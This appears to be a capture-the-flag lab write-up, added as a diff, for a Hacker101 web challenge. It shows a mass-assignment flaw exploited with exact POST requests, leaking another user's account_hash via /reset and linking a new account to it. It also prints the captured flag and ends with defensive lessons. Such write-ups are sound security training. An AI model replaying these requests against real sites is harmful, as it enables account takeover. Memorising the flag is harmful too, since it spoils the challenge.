@@ -1,0 +1,54 @@
+================================
+LAB: Moderate Grayhatcon CTF — HackerBay (Flag 2)
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: 2026-03-03
+Lab URL: https://f0af3b3e563154e9031f0935fe5ed0bb.ctf.hacker101.com
+Category: Web
+Level: Moderate
+Objective: Delete auction listing #8 owned by user hunter2
+Description: HackerBay auction platform. Malicious listing must be removed.
+
+[RECONNAISSANCE]
+----------------
+- Stack: openresty/1.27.1.2 (nginx + LuaJIT), HTTP/2
+- Endpoints: /, /login, /register, /reset, /dashboard, /dashboard/auctions, /dashboard/subusers, /auction/<id>
+- Auction #8 page source leaks owner: User: hunter2
+- hunter2 confirmed existing (register returns "Username already exists")
+- /reset exposes hidden field account_hash in response
+- /dashboard/subusers form contains hidden field owner_hash
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Mass Assignment on /register.
+
+/dashboard/subusers uses owner_hash to link a subuser to a parent account.
+/register accepts the same owner_hash parameter despite it not being in the public form.
+Server does not validate owner_hash against the authenticated session.
+
+hunter2's account_hash obtained via:
+  POST /reset  username=hunter2
+  -> account_hash=cf505baebbaf25a0a4c63eb93331eb36
+
+[EXPLOITATION]
+--------------
+1. POST /reset  username=hunter2
+   -> leaks account_hash=cf505baebbaf25a0a4c63eb93331eb36
+
+2. POST /register
+   new_username=test2&new_password=password&owner_hash=cf505baebbaf25a0a4c63eb93331eb36
+   -> 302 redirect to /awaiting-enable
+
+3. GET /awaiting-enable -> flag displayed
+
+[EVIDENCE]
+----------
+Flag: ^FLAG^8dd9564c9bdf36fe69fe712f527336b3721905dc2325dcf4c48835f3bb6c3482$FLAG$
+
+[LESSONS LEARNED]
+-----------------
+- Hidden form fields are client-controlled, never trust them server-side without session validation.
+- Mass assignment: whitelist accepted parameters explicitly.
+- Sensitive identifiers (account_hash) must not be exposed via unauthenticated endpoints.
